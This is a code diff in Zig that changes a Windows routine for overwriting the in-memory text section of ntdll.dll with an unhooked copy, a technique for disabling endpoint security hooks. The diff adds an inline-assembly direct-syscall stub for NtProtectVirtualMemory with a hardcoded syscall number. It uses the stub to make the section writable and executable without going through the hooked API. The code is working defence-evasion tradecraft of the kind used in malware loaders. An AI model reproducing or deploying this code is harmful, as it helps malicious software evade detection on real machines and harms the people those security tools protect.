@@ -5,6 +5,9 @@ const windows = @import("../win.zig");
 const IMAGE_FILE_HEADER = win.IMAGE_FILE_HEADER;
 const IMAGE_SECTION_HEADER = win.IMAGE_SECTION_HEADER;
 const PAGE_PROTECTION_FLAGS = win.PAGE_PROTECTION_FLAGS;
+const HANDLE = win.HANDLE;
+const PVOID = std.os.windows.PVOID;
+const NTSTATUS = std.os.windows.NTSTATUS;
 
 const MAX_PATH = win.MAX_PATH;
 const FILE_GENERIC_READ = win.FILE_GENERIC_READ;
@@ -14,6 +17,7 @@ const INVALID_HANDLE_VALUE = win.INVALID_HANDLE_VALUE;
 const INVALID_FILE_SIZE: u32 = 0xffffffff;
 const FILE_MAP_READ = win.FILE_MAP_READ;
 const PAGE_EXECUTE_WRITECOPY = win.PAGE_EXECUTE_WRITECOPY;
+const PAGE_EXECUTE_READWRITE = win.PAGE_EXECUTE_READWRITE;
 
 const getModuleHandleReplacement = windows.getModuleHandleReplacement;
 const getDosHeader = windows.getDosHeader;
@@ -29,6 +33,21 @@ const VirtualProtect = win.VirtualProtect;
 const GetLastError = win.GetLastError;
 const CloseHandle = win.CloseHandle;
 
+// TODO: current implementation only works on x64
+comptime {
+    asm (
+        \\.global NtProtectVirtualMemory
+        \\.section .text
+        \\NtProtectVirtualMemory:
+        \\  movq %rcx, %r10
+        \\  movl $0x50, %eax
+        \\  syscall
+        \\  ret
+    );
+}
+
+extern fn NtProtectVirtualMemory(process_handle: HANDLE, base_address: *PVOID, number_of_bytes_to_protect: *u32, new_access_protection: u32, old_access_protection: *u32) NTSTATUS;
+
 pub fn replaceNtdllTextSection(allocator: std.mem.Allocator) !void {
     const h_ntdll = try getModuleHandleReplacement(allocator, "ntdll.dll") orelse return error.FailedToGetNtdll;
 
@@ -39,24 +58,30 @@ pub fn replaceNtdllTextSection(allocator: std.mem.Allocator) !void {
 
     const unhooked_ntdll_text = try getNtdllText1(unhooked_ntdll.ptr);
 
-    var old_protection: PAGE_PROTECTION_FLAGS = undefined;
-    if (VirtualProtect(
-        local_ntdll_text.ptr,
-        local_ntdll_text.len,
-        PAGE_EXECUTE_WRITECOPY,
+    var old_protection: u32 = 0;
+    var base_address: *anyopaque = @ptrCast(local_ntdll_text.ptr);
+    var number_of_bytes_to_protect: u32 = @intCast(local_ntdll_text.len);
+
+    const status = NtProtectVirtualMemory(
+        std.os.windows.GetCurrentProcess(),
+        &base_address,
+        &number_of_bytes_to_protect,
+        @bitCast(PAGE_EXECUTE_READWRITE),
         &old_protection,
-    ) == 0) {
-        std.debug.print("[!] VirtualProtect [1] Failed With Error: {s}\n", .{@tagName(GetLastError())});
-        return error.VirtualProtectFailed;
+    );
+    if (status != .SUCCESS) {
+        std.debug.print("[!] NtProtectVirtualMemory Failed With Error: {s}\n", .{@tagName(status)});
+        return error.NtProtectVirtualMemoryFailed;
     }
 
     @memcpy(local_ntdll_text, unhooked_ntdll_text);
 
+    var old_protection2: PAGE_PROTECTION_FLAGS = @bitCast(old_protection);
     if (VirtualProtect(
         local_ntdll_text.ptr,
         local_ntdll_text.len,
-        old_protection,
-        &old_protection,
+        old_protection2,
+        &old_protection2,
     ) == 0) {
         std.debug.print("[!] VirtualProtect [2] Failed With Error: {s}\n", .{@tagName(GetLastError())});
         return error.VirtualProtectFailed;
